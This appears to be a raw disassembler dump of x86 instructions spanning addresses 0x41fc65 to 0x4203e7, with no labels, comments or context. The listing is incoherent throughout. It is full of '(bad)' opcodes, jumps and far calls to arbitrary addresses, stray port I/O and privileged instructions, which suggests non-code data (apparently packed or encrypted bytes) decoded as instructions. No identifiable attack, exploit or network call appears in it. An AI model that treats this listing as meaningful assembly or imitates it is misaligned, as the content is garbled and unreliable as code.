  41fc65:	cmp    ebx,DWORD PTR [ebx+0x70349db8]
  41fc6b:	popf   
  41fc6c:	sbb    al,0xe7
  41fc6e:	jmp    0x222c:0x57cd1726
  41fc75:	std    
  41fc76:	test   al,0x3
  41fc78:	xchg   ecx,eax
  41fc79:	and    eax,ecx
  41fc7b:	jb     0x41fcb3
  41fc7d:	mov    dl,BYTE PTR [ebx+0x63]
  41fc80:	sub    DWORD PTR [esi+edi*2],ecx
  41fc83:	mov    ebx,0x98ca52ea
  41fc88:	cdq    
  41fc89:	xchg   esi,eax
  41fc8a:	mov    ecx,0xdb5750dd
  41fc8f:	in     eax,dx
  41fc90:	in     eax,0x11
  41fc92:	sbb    BYTE PTR [eax],0x3e
  41fc95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc96:	out    0x4f,eax
  41fc98:	mov    cl,0xcf
  41fc9a:	pop    esi
  41fc9b:	mov    esi,?
  41fc9d:	pop    es
  41fc9e:	es mov eax,0x2588e097
  41fca4:	dec    ecx
  41fca5:	inc    esi
  41fca6:	fs push es
  41fca8:	call   0x32442b02
  41fcad:	aas    
  41fcae:	adc    eax,0x2b2329a4
  41fcb3:	cmp    al,0x2f
  41fcb5:	imul   ecx,DWORD PTR [edi-0xb378e12],0x72
  41fcbc:	sti    
  41fcbd:	or     BYTE PTR [ebx-0x73],0xd7
  41fcc1:	mov    ?,WORD PTR [edx-0x348a3aee]
  41fcc7:	lea    ecx,[ecx+0x43aee227]
  41fccd:	inc    edx
  41fcce:	lahf   
  41fccf:	cmp    dh,BYTE PTR [ebx+edi*4]
  41fcd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcd3:	and    BYTE PTR [eax],dl
  41fcd5:	inc    edi
  41fcd6:	(bad)  
  41fcd8:	pop    es
  41fcd9:	in     al,0xb5
  41fcdb:	pop    ebx
  41fcdc:	retf   
  41fcdd:	mov    edi,DWORD PTR [ecx+esi*4]
  41fce0:	jle    0x41fca2
  41fce2:	inc    edi
  41fce3:	ja     0x41fcf4
  41fce5:	lods   al,BYTE PTR ds:[esi]
  41fce6:	mov    ch,0x7a
  41fce8:	cs add ebx,0x16
  41fcec:	shl    BYTE PTR [edx],1
  41fcee:	pusha  
  41fcef:	(bad)  
  41fcf0:	mov    ecx,0x48205dff
  41fcf5:	sub    cl,ch
  41fcf7:	xchg   edi,eax
  41fcf8:	cmp    esp,0x3b
  41fcfb:	adc    BYTE PTR [edx+0x35e46ed2],ch
  41fd01:	dec    ebp
  41fd02:	mov    ds:0x265234d7,eax
  41fd07:	jne    0x41fcbc
  41fd09:	out    0x94,al
  41fd0b:	cs pop ss
  41fd0d:	jp     0x41fcd4
  41fd0f:	sub    eax,0x11eb538f
  41fd14:	sbb    BYTE PTR [eax],ch
  41fd16:	xchg   esp,eax
  41fd17:	jge    0x41fd0b
  41fd19:	test   eax,0x20c3cb92
  41fd1e:	xchg   DWORD PTR [ebp-0x67],ebx
  41fd21:	or     al,0x6c
  41fd23:	jns    0x41fd93
  41fd25:	sbb    bh,BYTE PTR [ebx]
  41fd27:	cld    
  41fd28:	fcomp  DWORD PTR [edx]
  41fd2a:	inc    edi
  41fd2b:	(bad)  
  41fd2c:	jae    0x41fd99
  41fd2e:	pop    edx
  41fd2f:	inc    edx
  41fd30:	fwait
  41fd31:	add    ecx,edx
  41fd33:	cld    
  41fd34:	add    DWORD PTR [ecx+0x74],ecx
  41fd37:	dec    ebx
  41fd38:	mov    DWORD PTR [ecx-0x6758f68a],edx
  41fd3e:	inc    esi
  41fd3f:	(bad)  
  41fd40:	push   ebp
  41fd41:	mov    dh,0xaa
  41fd43:	mov    BYTE PTR [edx+edx*2+0x49a9b548],ah
  41fd4a:	inc    ebp
  41fd4b:	cmp    DWORD PTR [esi+0x49571ce3],ebx
  41fd51:	xlat   BYTE PTR ds:[ebx]
  41fd52:	sbb    dh,BYTE PTR [eax]
  41fd54:	fnstsw WORD PTR ds:0x6a35fba2
  41fd5a:	push   ecx
  41fd5b:	mov    al,ds:0x17f8200d
  41fd60:	xor    ecx,DWORD PTR [eax+0x1c]
  41fd63:	in     eax,0x93
  41fd65:	xchg   BYTE PTR [ebx-0x8d100b3],bl
  41fd6b:	and    esp,DWORD PTR [ebx+0x6d58101b]
  41fd71:	jmp    0x77ebfb81
  41fd76:	jg     0x41fd79
  41fd78:	add    eax,0xe89d8249
  41fd7d:	add    al,0x2e
  41fd7f:	test   DWORD PTR [ebx-0x2b83dd6a],ebp
  41fd85:	jne    0x41fd2c
  41fd87:	cdq    
  41fd88:	inc    ecx
  41fd89:	cmc    
  41fd8a:	out    dx,eax
  41fd8b:	fdiv   DWORD PTR [esi]
  41fd8d:	cmp    eax,0x8e4a139
  41fd92:	sub    DWORD PTR [ebp+0x9eb4b10],ebp
  41fd98:	shl    BYTE PTR [edi+0x12],0xd
  41fd9c:	dec    ebx
  41fd9d:	push   es
  41fd9e:	jno    0x41fd3c
  41fda0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fda1:	pop    esp
  41fda2:	push   edi
  41fda3:	and    eax,0xdc8e4437
  41fda8:	dec    edi
  41fda9:	fst    QWORD PTR [ecx]
  41fdab:	add    al,0xa6
  41fdad:	icebp  
  41fdae:	hlt    
  41fdaf:	jo     0x41fda5
  41fdb1:	xor    eax,0x3b1f0b0f
  41fdb6:	jge    0x41fdfc
  41fdb8:	scas   al,BYTE PTR es:[edi]
  41fdb9:	lahf   
  41fdba:	dec    ecx
  41fdbb:	fstp   DWORD PTR [eax]
  41fdbd:	and    ah,cl
  41fdbf:	out    0xc,eax
  41fdc1:	not    DWORD PTR ds:0x5567d05b
  41fdc7:	cli    
  41fdc8:	xor    cl,0x45
  41fdcb:	sti    
  41fdcc:	retf   
  41fdcd:	shl    DWORD PTR [eax+0x20df4af0],cl
  41fdd3:	pop    ecx
  41fdd4:	pop    ebp
  41fdd5:	dec    ebx
  41fdd6:	or     BYTE PTR [ecx+0x475d13a],ch
  41fddc:	dec    ebx
  41fddd:	mov    ds:0xc4df5458,al
  41fde2:	sub    bl,al
  41fde4:	int    0xe
  41fde6:	xchg   BYTE PTR [esi],al
  41fde8:	push   edx
  41fde9:	pop    ds
  41fdea:	jno    0x41fe4b
  41fdec:	xchg   esi,eax
  41fded:	mov    ebx,0x183a2f4c
  41fdf2:	test   BYTE PTR [edx-0x2f3123b6],ah
  41fdf8:	aas    
  41fdf9:	push   edx
  41fdfa:	mov    ebp,0x8f3b729c
  41fdff:	lods   al,BYTE PTR ds:[esi]
  41fe00:	repz and DWORD PTR [edi],0x442363e9
  41fe07:	sahf   
  41fe08:	adc    eax,0x4f6c7084
  41fe0d:	aas    
  41fe0e:	sbb    edi,DWORD PTR [eax+0x1]
  41fe11:	and    eax,0x37e763a9
  41fe16:	xor    DWORD PTR [ecx+edx*2+0x5bd88e0b],esi
  41fe1d:	fcom   st(5)
  41fe1f:	jbe    0x41fe42
  41fe21:	inc    ebx
  41fe22:	inc    esi
  41fe23:	mov    esi,0x6e521378
  41fe28:	popa   
  41fe29:	aaa    
  41fe2a:	inc    edi
  41fe2b:	mov    ch,0x27
  41fe2d:	inc    BYTE PTR [ebx+edi*2]
  41fe30:	scas   al,BYTE PTR es:[edi]
  41fe31:	pop    ss
  41fe32:	or     eax,0x2e2edb1b
  41fe37:	cmp    BYTE PTR [edi-0x38dd6bdd],0x89
  41fe3e:	or     bl,al
  41fe40:	fnstcw WORD PTR [ebx+0x131ccc43]
  41fe46:	pop    ss
  41fe47:	adc    esi,DWORD PTR [eax-0x3f0b8f9a]
  41fe4d:	mov    ebx,0xa3cea656
  41fe52:	xor    ch,al
  41fe54:	iret   
  41fe55:	jmp    0x41fea5
  41fe57:	dec    eax
  41fe58:	add    DWORD PTR ds:0x59b42615,ecx
  41fe5e:	and    eax,DWORD PTR [ebp-0x34]
  41fe61:	mov    ebp,0x5081fd32
  41fe66:	pop    ds
  41fe67:	std    
  41fe68:	nop
  41fe69:	leave  
  41fe6a:	and    eax,0x7ba3a42d
  41fe6f:	in     al,dx
  41fe70:	dec    esp
  41fe71:	mov    al,ds:0x7097cfc0
  41fe76:	inc    esi
  41fe77:	xchg   edi,eax
  41fe78:	sbb    DWORD PTR [edi-0x62],0x6d
  41fe7c:	int3   
  41fe7d:	or     edi,DWORD PTR [ebp-0x4b66ce77]
  41fe83:	sub    ebp,DWORD PTR [ecx+0x43]
  41fe86:	adc    ebx,0xab0403a4
  41fe8c:	or     ecx,DWORD PTR [ecx+ebp*8-0x21fe8a83]
  41fe93:	and    al,0xb4
  41fe95:	(bad)  
  41fe96:	jl     0x41fe47
  41fe98:	ja     0x41fe71
  41fe9a:	lea    esp,[ebp+ecx*4-0x7ad9e1aa]
  41fea1:	add    esp,eax
  41fea3:	enter  0xf0d1,0x2a
  41fea7:	pop    edi
  41fea8:	jmp    0xe7744752
  41fead:	jge    0x41fe3b
  41feaf:	inc    ecx
  41feb0:	xchg   esi,eax
  41feb1:	mov    eax,0x98fdae98
  41feb6:	fcmovu st,st(5)
  41feb8:	add    DWORD PTR [ebx-0x30],0xdea38daa
  41febf:	in     eax,dx
  41fec0:	dec    edi
  41fec1:	out    0x9e,eax
  41fec3:	mov    ebp,DWORD PTR [edi]
  41fec5:	mov    edx,0xad3b1f9c
  41feca:	jl     0x41fef3
  41fecc:	sub    al,0xa9
  41fece:	hlt    
  41fecf:	sbb    esp,ecx
  41fed1:	je     0x41fe5a
  41fed3:	push   edx
  41fed4:	mov    DWORD PTR [esp+eax*1-0x6f36c578],eax
  41fedb:	dec    ebp
  41fedc:	(bad)
  41fee1:	jne    0x41ff51
  41fee3:	daa    
  41fee4:	pand   mm2,QWORD PTR [eax]
  41fee7:	push   edi
  41fee8:	cmc    
  41fee9:	mov    WORD PTR [ebx],fs
  41feeb:	fwait
  41feec:	pop    esi
  41feed:	dec    ebp
  41feee:	adc    edi,DWORD PTR [esi*8+0x7ff2734e]
  41fef5:	(bad)  
  41fef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fef7:	xlat   BYTE PTR ds:[ebx]
  41fef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fef9:	ror    BYTE PTR [esi-0x10553f6d],cl
  41feff:	nop
  41ff00:	jns    0x41fe94
  41ff02:	pop    esp
  41ff03:	sub    BYTE PTR [ebp+0x451c517b],cl
  41ff09:	aaa    
  41ff0a:	or     BYTE PTR [eax+0x78cb0afe],cl
  41ff10:	jno    0x41ff6a
  41ff12:	or     al,0x76
  41ff14:	mov    eax,ds:0x346a79a1
  41ff19:	add    BYTE PTR [ecx+ecx*8+0x2ebd20fa],bh
  41ff20:	(bad)  
  41ff21:	mov    dh,0xfd
  41ff23:	fild   QWORD PTR [ebx]
  41ff25:	sbb    BYTE PTR [edx],al
  41ff27:	mov    bl,0x69
  41ff29:	xchg   BYTE PTR ds:0xc959e31b,ah
  41ff2f:	dec    edi
  41ff30:	div    ah
  41ff32:	ins    BYTE PTR es:[edi],dx
  41ff33:	sub    al,0x2c
  41ff35:	mov    al,ds:0xc796857a
  41ff3a:	add    esi,DWORD PTR [ecx-0x75412555]
  41ff40:	xchg   esi,eax
  41ff41:	cdq    
  41ff42:	pop    edx
  41ff43:	bswap  edx
  41ff45:	dec    eax
  41ff46:	add    ah,BYTE PTR [ebp+0x3a8eb2df]
  41ff4c:	and    DWORD PTR [edx],esp
  41ff4e:	pop    ss
  41ff4f:	ror    DWORD PTR [ecx],0xb9
  41ff52:	imul   ebx,DWORD PTR [ebx+ebx*4],0xffffff87
  41ff56:	shl    BYTE PTR [ebp+0x3039ff36],1
  41ff5c:	aad    0xb4
  41ff5e:	mov    cl,0x31
  41ff60:	mov    esi,0x60c1a875
  41ff65:	push   edx
  41ff66:	pop    ecx
  41ff67:	std    
  41ff68:	icebp  
  41ff69:	push   cs
  41ff6a:	dec    ebp
  41ff6b:	xchg   esi,eax
  41ff6c:	cmp    DWORD PTR [edi],edx
  41ff6e:	std    
  41ff6f:	das    
  41ff70:	xchg   BYTE PTR [esi+0x2c4d91ab],ch
  41ff76:	push   0x162b329d
  41ff7b:	les    ebp,FWORD PTR [ebp-0x2a]
  41ff7e:	mov    bl,0x78
  41ff80:	mov    WORD PTR [edx+0x24e89e11],cs
  41ff86:	adc    cl,BYTE PTR [ebp+0x5730a604]
  41ff8c:	fiadd  WORD PTR [edi-0x43]
  41ff8f:	inc    ecx
  41ff90:	(bad)  
  41ff92:	mov    dh,0x4a
  41ff94:	jnp    0x41ff2c
  41ff96:	sbb    eax,0xfe1c25d5
  41ff9b:	push   ecx
  41ff9c:	sbb    al,0xf8
  41ff9e:	and    BYTE PTR [ecx],ch
  41ffa0:	aam    0x2f
  41ffa2:	mov    ecx,0x990f27d9
  41ffa7:	push   es
  41ffa8:	lds    edi,FWORD PTR [edx+ecx*4+0x47]
  41ffac:	inc    esi
  41ffad:	loopne 0x41ffcb
  41ffaf:	push   esp
  41ffb0:	arpl   WORD PTR [ebp+0x5c55119e],cx
  41ffb6:	inc    ecx
  41ffb7:	or     BYTE PTR [ebx+0x604f4bbf],al
  41ffbd:	jno    0x420007
  41ffbf:	loopne 0x41ff4b
  41ffc1:	mov    ds:0xa88a43e3,eax
  41ffc6:	pushf  
  41ffc7:	(bad)  
  41ffc8:	(bad)  
  41ffc9:	out    0x77,eax
  41ffcb:	hlt    
  41ffcc:	clc    
  41ffcd:	popf   
  41ffce:	stos   DWORD PTR es:[edi],eax
  41ffcf:	(bad)  
  41ffd0:	iret   
  41ffd1:	lahf   
  41ffd2:	rcl    BYTE PTR [ecx+ebp*8],1
  41ffd5:	cmp    ah,dl
  41ffd7:	and    ebx,DWORD PTR [eax-0x30]
  41ffda:	and    eax,0xb13c2de8
  41ffdf:	cli    
  41ffe0:	jo     0x41ffdb
  41ffe2:	mov    cl,0x76
  41ffe4:	xchg   ecx,eax
  41ffe5:	into   
  41ffe6:	ret    
  41ffe7:	std    
  41ffe8:	in     eax,0xa6
  41ffea:	out    0x70,al
  41ffec:	retf   
  41ffed:	popf   
  41ffee:	xchg   edi,eax
  41ffef:	sbb    al,0x17
  41fff1:	outs   dx,DWORD PTR ds:[esi]
  41fff2:	mul    DWORD PTR [ebp-0x6c]
  41fff5:	push   edi
  41fff6:	call   0xd9732286
  41fffb:	ror    DWORD PTR [edi],0x9e
  41fffe:	and    esi,DWORD PTR [edi]
  420000:	add    DWORD PTR [esp+eiz*2+0x64],edi
  420004:	and    esi,DWORD PTR ds:0xab4314a6
  42000a:	inc    ebp
  42000b:	push   0x78778cd0
  420010:	mov    dh,0x91
  420012:	cmp    eax,DWORD PTR [edi]
  420014:	nop
  420015:	lea    ecx,[di+0x54f]
  42001a:	scas   eax,DWORD PTR es:[edi]
  42001b:	in     eax,dx
  42001c:	or     eax,0xe613c82d
  420021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420022:	pminub mm5,mm4
  420025:	add    edx,DWORD PTR [edx]
  420027:	leave  
  420028:	scas   eax,DWORD PTR es:[edi]
  420029:	nop
  42002a:	(bad)  
  42002b:	jnp    0x420015
  42002d:	int    0xe5
  42002f:	shl    esi,cl
  420031:	in     al,0x8f
  420033:	ss daa 
  420035:	scas   al,BYTE PTR es:[edi]
  420036:	sti    
  420037:	scas   eax,DWORD PTR es:[edi]
  420038:	nop
  420039:	sbb    dl,al
  42003b:	loopne 0x420052
  42003d:	ja     0x420094
  42003f:	mov    fs,WORD PTR [ecx]
  420041:	xor    BYTE PTR [ecx+0x43db63e5],0xa3
  420048:	test   esp,esi
  42004a:	inc    ecx
  42004b:	rcl    DWORD PTR [edi-0x21928041],cl
  420051:	xchg   ebp,eax
  420052:	xchg   BYTE PTR [edi-0x35],bl
  420055:	(bad)  
  420056:	push   esi
  420057:	push   edx
  420058:	inc    esi
  420059:	dec    esi
  42005a:	fwait
  42005b:	sub    al,0x11
  42005d:	ret    
  42005e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42005f:	fst    DWORD PTR [edx+0x56]
  420062:	or     eax,esi
  420064:	cmp    al,0x37
  420066:	mov    ch,0xa7
  420068:	push   ss
  420069:	mov    DWORD PTR [esi+0x41],ebp
  42006c:	jne    0x420088
  42006e:	pop    ebx
  42006f:	sbb    eax,0xe4540d5a
  420074:	je     0x420042
  420076:	sbb    dh,BYTE PTR [ebx+0x47931743]
  42007c:	mov    bh,0xe4
  42007e:	jp     0x4200b7
  420080:	outs   dx,DWORD PTR ds:[esi]
  420081:	or     DWORD PTR [ebp+0x24ebbe92],ebx
  420087:	cmc    
  420088:	fldcw  WORD PTR [ebx+0x62]
  42008b:	in     eax,0x53
  42008d:	or     al,0xf7
  42008f:	xor    bl,bl
  420091:	cli    
  420092:	mov    BYTE PTR [ecx+eiz*4+0xd],cl
  420096:	add    al,0xb4
  420098:	sbb    esi,DWORD PTR [eax+0x4e]
  42009b:	test   al,0x2f
  42009d:	push   ds
  42009e:	sub    BYTE PTR [edi],dl
  4200a0:	sub    ebp,DWORD PTR [edi+0x3e]
  4200a3:	adc    esp,0x3e
  4200a6:	lds    ecx,FWORD PTR [eax+0x138c9ce8]
  4200ac:	jp     0x42005c
  4200ae:	cmp    BYTE PTR [eax-0x48],dh
  4200b1:	jge    0x420065
  4200b3:	addr16 in eax,0x5
  4200b6:	or     BYTE PTR [eax],ch
  4200b8:	and    DWORD PTR [esp+ecx*8],ecx
  4200bb:	and    DWORD PTR [ebx+ebx*8],0xabdda85e
  4200c2:	push   es
  4200c3:	dec    DWORD PTR cs:[esp+edx*2-0x333cfef6]
  4200cb:	jbe    0x42007d
  4200cd:	add    esi,eax
  4200cf:	dec    ecx
  4200d0:	pushf  
  4200d1:	sub    bl,BYTE PTR [ecx+eax*4-0x7df497c4]
  4200d8:	cli    
  4200d9:	aam    0x1e
  4200db:	cmp    BYTE PTR [ebx-0x7a],bl
  4200de:	sub    WORD PTR [ecx],cx
  4200e1:	cmp    BYTE PTR [ebx-0x6bbc694e],ch
  4200e7:	xchg   DWORD PTR [eax+ebp*8-0x63459001],edx
  4200ee:	je     0x4200eb
  4200f0:	shr    DWORD PTR [eax+0x2b],1
  4200f3:	fst    QWORD PTR [eax]
  4200f5:	xor    edx,DWORD PTR [ecx-0x72]
  4200f8:	mul    bl
  4200fa:	push   ss
  4200fb:	or     ch,ch
  4200fd:	lahf   
  4200fe:	mov    al,ds:0x7b69d8ad
  420103:	iret   
  420104:	pop    ebp
  420105:	loop   0x4200dd
  420107:	mov    esp,DWORD PTR [ebx+ecx*2]
  42010a:	and    al,0xd5
  42010c:	cli    
  42010d:	outs   dx,BYTE PTR ds:[esi]
  42010e:	xchg   ecx,eax
  42010f:	add    eax,0x5c0146a4
  420114:	inc    edx
  420115:	adc    bh,ah
  420117:	mov    eax,0xeba1fc80
  42011c:	jmp    0x1cd3:0x9dd51ba0
  420123:	retf   0x116a
  420126:	aam    0x2d
  420128:	jecxz  0x42011f
  42012a:	and    al,0x89
  42012c:	cld    
  42012d:	pusha  
  42012e:	and    DWORD PTR [esp+ebx*4],edi
  420131:	push   0xffffffd4
  420133:	and    BYTE PTR [edi-0x7389e3f7],ah
  420139:	and    dl,dl
  42013b:	push   ds
  42013c:	leave  
  42013d:	dec    edi
  42013e:	lods   eax,DWORD PTR ds:[esi]
  42013f:	addr16 xor edi,ecx
  420142:	fisub  WORD PTR [eax+0x46]
  420145:	xor    DWORD PTR [ebp-0x49],ebx
  420148:	inc    edi
  420149:	push   esi
  42014a:	add    eax,0xad17a718
  42014f:	ret    
  420150:	or     ebx,ebp
  420152:	push   edx
  420153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420154:	cmp    al,BYTE PTR [esi]
  420156:	and    al,0x36
  420158:	xchg   esp,eax
  420159:	out    dx,al
  42015a:	dec    eax
  42015b:	push   0xc980bae7
  420160:	xchg   ebx,eax
  420161:	jb     0x4200f5
  420163:	je     0x420187
  420165:	inc    esp
  420166:	sub    edx,DWORD PTR [ecx-0x1c]
  420169:	xor    eax,DWORD PTR [ebx+0x3d70bbb1]
  42016f:	xchg   esp,eax
  420170:	xor    ebp,ebx
  420172:	(bad)  
  420173:	rcr    ah,0x63
  420176:	fsubr  st,st(5)
  420178:	push   esp
  420179:	cmc    
  42017a:	sub    ecx,DWORD PTR [ecx]
  42017c:	sti    
  42017d:	nop
  42017e:	inc    ecx
  42017f:	es sub al,0x14
  420182:	mov    esi,0x2f8cc67
  420187:	shl    edi,0x17
  42018a:	mov    esp,0x7f2ebbc0
  42018f:	mov    al,BYTE PTR [edx-0x3c]
  420192:	mov    esp,0xbc366d18
  420197:	pusha  
  420198:	add    al,0xf3
  42019a:	retf   0xab10
  42019d:	lea    esp,[edx+0x4a]
  4201a0:	test   BYTE PTR [esi+0x5fedacae],ch
  4201a6:	sti    
  4201a7:	xlat   BYTE PTR ds:[ebx]
  4201a8:	data16 ffreep st(6)
  4201ab:	sub    BYTE PTR [ecx],bh
  4201ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ae:	jecxz  0x42018f
  4201b0:	dec    eax
  4201b1:	mov    ds:0x80ab165,al
  4201b6:	xchg   ebp,eax
  4201b7:	sub    edi,DWORD PTR [ebx-0x598ad037]
  4201bd:	loop   0x4201bd
  4201bf:	popa   
  4201c0:	mov    edi,0x64bcfbc1
  4201c5:	mov    dl,0xab
  4201c7:	jp     0x4201c6
  4201c9:	and    eax,0xffffff93
  4201cc:	xlat   BYTE PTR es:[ebx]
  4201ce:	adc    eax,0x948f94ba
  4201d3:	das    
  4201d4:	push   es
  4201d5:	test   dh,ah
  4201d7:	das    
  4201d8:	cwde   
  4201d9:	jns    0x4201b1
  4201db:	mov    ecx,0xe1fcd91f
  4201e0:	inc    eax
  4201e1:	xor    al,0x39
  4201e3:	jp     0x4201ca
  4201e5:	sbb    al,0x20
  4201e7:	in     al,0x6f
  4201e9:	cli    
  4201ea:	lock repz fst QWORD PTR [edi+0x74]
  4201ef:	xlat   BYTE PTR ds:[ebx]
  4201f0:	mov    esi,DWORD PTR [ebx]
  4201f2:	mov    ds:0x1ce61da,al
  4201f7:	cmp    ecx,0x89e6f373
  4201fd:	loopne 0x420202
  4201ff:	push   ss
  420200:	xchg   BYTE PTR [eax],ch
  420202:	jmp    0x420236
  420204:	pop    ss
  420205:	popf   
  420206:	(bad)  
  420208:	gs test al,0x98
  42020b:	sbb    edi,DWORD PTR [edx+0x40a6595b]
  420211:	ror    DWORD PTR ds:0xc37cc051,1
  420217:	fs fucomp st(7)
  42021a:	mov    bl,0x23
  42021c:	sbb    eax,edi
  42021e:	dec    edx
  42021f:	int    0xd
  420221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420224:	inc    ebx
  420225:	mov    edx,0xeacd620e
  42022a:	sbb    DWORD PTR [eax+0x45891fcd],esp
  420230:	in     eax,0x65
  420232:	dec    ecx
  420233:	clc    
  420234:	xchg   ecx,eax
  420235:	(bad)  [edi]
  420237:	lea    ebx,ds:0x287e87c8
  42023d:	repnz mov bl,0xf5
  420240:	dec    edx
  420241:	lods   al,BYTE PTR ds:[esi]
  420242:	call   0xbb2e:0x5de71e7b
  420249:	add    DWORD PTR ds:0x51531734,0xffffff83
  420250:	fs add ah,dh
  420253:	add    ecx,DWORD PTR [eax]
  420255:	clc    
  420256:	mov    bl,0xba
  420258:	mov    ah,0xd3
  42025a:	clc    
  42025b:	ss (bad) 
  42025d:	ds push es
  42025f:	push   cs
  420260:	in     eax,dx
  420261:	cmp    dl,BYTE PTR [eax+edx*8+0x340420a8]
  420268:	xor    DWORD PTR [ebp-0x4c],esp
  42026b:	(bad)  
  42026d:	lods   al,BYTE PTR ds:[esi]
  42026e:	and    DWORD PTR [ecx+0x61],edi
  420271:	or     eax,0x9af4cf37
  420276:	xor    BYTE PTR [eax-0x6484aa45],cl
  42027c:	mov    esi,DWORD PTR [esi]
  42027e:	sbb    eax,DWORD PTR [edx-0xae2d3e6]
  420284:	adc    al,0x7d
  420286:	clc    
  420287:	call   0xc35f5e1d
  42028c:	push   edi
  42028d:	cs jne 0x420223
  420290:	and    esp,DWORD PTR [eax]
  420292:	repz pop es
  420294:	mov    bh,0x49
  420296:	jle    0x420266
  420298:	int3   
  420299:	imul   eax,DWORD PTR [ebp+0x2fb22f72],0x95e0e1d3
  4202a3:	mov    ch,0x32
  4202a5:	fdivr  QWORD PTR [edi+edi*1]
  4202a8:	inc    esp
  4202a9:	xor    DWORD PTR [edi-0x6d],esi
  4202ac:	imul   edx,esi,0xffffffb7
  4202af:	mov    BYTE PTR [edi+0x56c99e],bh
  4202b5:	pop    es
  4202b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202b7:	out    0xf4,eax
  4202b9:	test   al,0xf2
  4202bb:	mov    ch,0x99
  4202bd:	and    dl,BYTE PTR [ecx]
  4202bf:	icebp  
  4202c0:	dec    ebx
  4202c1:	adc    DWORD PTR [edx+0x77a1ad0],edx
  4202c7:	hlt    
  4202c8:	std    
  4202c9:	and    al,0xb8
  4202cb:	test   DWORD PTR [esi-0x7d],ebx
  4202ce:	cmc    
  4202cf:	jbe    0x4202de
  4202d1:	or     dh,bh
  4202d3:	daa    
  4202d4:	mov    eax,DWORD PTR [esi]
  4202d6:	dec    esp
  4202d7:	aad    0x6d
  4202d9:	pushf  
  4202da:	je     0x4202b5
  4202dc:	inc    edi
  4202dd:	in     eax,dx
  4202de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202df:	test   al,0x53
  4202e1:	popa   
  4202e2:	or     edx,DWORD PTR [eax+ecx*2+0x4f8ea337]
  4202e9:	test   eax,0xeca1d63a
  4202ee:	mov    cl,0x49
  4202f0:	shl    ch,1
  4202f2:	enter  0x68c8,0x7c
  4202f6:	test   DWORD PTR [esi-0x5f],ecx
  4202f9:	cwde   
  4202fa:	push   esp
  4202fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202fc:	enter  0x505b,0x63
  420300:	xlat   BYTE PTR ds:[ebx]
  420301:	mov    bh,0x71
  420303:	jns    0x420359
  420305:	or     BYTE PTR [edi],0x59
  420308:	or     edx,esp
  42030a:	inc    esp
  42030b:	inc    edi
  42030c:	cmp    BYTE PTR [ecx+eiz*8-0x30],bh
  420310:	sub    eax,ecx
  420312:	into   
  420313:	cmp    DWORD PTR [edi-0x23],0x9
  420317:	pop    es
  420318:	mov    cl,0x50
  42031a:	xchg   DWORD PTR [edi+0x25],eax
  42031d:	or     bh,BYTE PTR [esi]
  42031f:	sub    eax,0x50624f02
  420324:	(bad)  
  420325:	scas   al,BYTE PTR es:[edi]
  420326:	xor    cl,bh
  420328:	int3   
  420329:	dec    edi
  42032a:	mov    dh,0x16
  42032c:	add    BYTE PTR [ebx],dl
  42032e:	xchg   ebx,eax
  42032f:	not    BYTE PTR [esp+edi*1]
  420332:	cld    
  420333:	gs dec ebp
  420335:	jle    0x4202ba
  420337:	mov    edx,0xd9077d13
  42033c:	fstp   TBYTE PTR fs:[ecx-0x48ce4553]
  420343:	loopne 0x420370
  420345:	js     0x4202da
  420347:	sub    BYTE PTR [eax-0x43],dh
  42034a:	add    al,0x79
  42034c:	mov    ebx,DWORD PTR [ebp-0x5]
  42034f:	cmp    eax,DWORD PTR [edi-0x4fcf5bf3]
  420355:	ret    
  420356:	jecxz  0x42034b
  420358:	and    dh,BYTE PTR [ebp+0x1c]
  42035b:	and    eax,0xa7bc70ac
  420360:	push   esi
  420361:	mov    BYTE PTR [edi-0xd],bl
  420364:	pop    eax
  420365:	(bad)  
  420366:	ins    BYTE PTR es:[edi],dx
  420367:	jmp    0xb89a04f9
  42036c:	retf   0xf523
  42036f:	pop    es
  420370:	(bad)  
  420371:	mov    eax,0xab91cecc
  420376:	and    eax,0xf6be6a28
  42037b:	fmul   st,st(3)
  42037d:	shr    BYTE PTR [eax+0x1d],1
  420380:	jmp    0x2952cbfb
  420385:	inc    edx
  420386:	and    DWORD PTR [edx],esp
  420388:	mov    WORD PTR [eax+0x2c],ds
  42038b:	sbb    bl,BYTE PTR cs:[ecx]
  42038e:	dec    edi
  42038f:	sbb    al,bh
  420391:	mov    ebx,0xdfba0686
  420396:	mov    bh,BYTE PTR [ecx-0xe]
  420399:	rol    DWORD PTR [eax+edx*4],0x13
  42039d:	pop    ebx
  42039e:	mov    ebp,0xc11d83a
  4203a3:	sbb    DWORD PTR [ebp+0x7dd02ec7],ebp
  4203a9:	aam    0x1
  4203ab:	push   ebx
  4203ac:	ret    
  4203ad:	push   0xf25daf4b
  4203b2:	sub    cl,bl
  4203b4:	lods   eax,DWORD PTR ds:[esi]
  4203b5:	scas   al,BYTE PTR es:[edi]
  4203b6:	scas   al,BYTE PTR es:[edi]
  4203b7:	mov    BYTE PTR [edi+0x58ff607c],al
  4203bd:	ret    
  4203be:	xchg   ebp,eax
  4203bf:	jle    0x420395
  4203c1:	rcr    BYTE PTR ds:0x2a646863,1
  4203c7:	mov    eax,0x97b4669f
  4203cc:	ror    BYTE PTR [ebp+0xf4e46c3],1
  4203d2:	iret   
  4203d3:	rol    DWORD PTR [ecx-0x5b],cl
  4203d6:	push   cs
  4203d7:	inc    eax
  4203d8:	mov    BYTE PTR [edx+ebp*2],al
  4203db:	xchg   ebp,eax
  4203dc:	dec    ebp
  4203dd:	jbe    0x4203b9
  4203df:	test   DWORD PTR [ecx],edi
  4203e1:	add    BYTE PTR [ebx-0x60],bl
  4203e4:	push   cs
  4203e5:	rcl    ebp,cl
  4203e7:	inc    esp
